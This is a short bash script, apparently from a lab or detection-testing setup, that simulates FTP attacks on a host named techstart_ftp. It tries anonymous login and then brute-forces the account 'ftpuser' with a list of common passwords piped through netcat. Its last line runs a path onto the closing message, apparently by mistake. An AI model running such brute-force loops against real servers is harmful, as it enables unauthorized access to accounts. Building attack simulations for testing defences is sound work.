#!/bin/bash
# ftp_attacks.sh - Script to simulate FTP attacks

echo "[+] Starting FTP attack simulation"

echo "[+] Attempting anonymous login"
echo -e "anonymous\nanonymous\nquit" | nc techstart_ftp 21

echo "[+] Simulating FTP brute force attack"
for pass in password123 admin123 ftppass secret letmein; do
  echo "[+] Trying password: $pass"
  echo -e "USER ftpuser\nPASS $pass\nquit" | nc techstart_ftp 21
done

echo "[+] FTP attacks complete"/scripts/notify_attack.sh
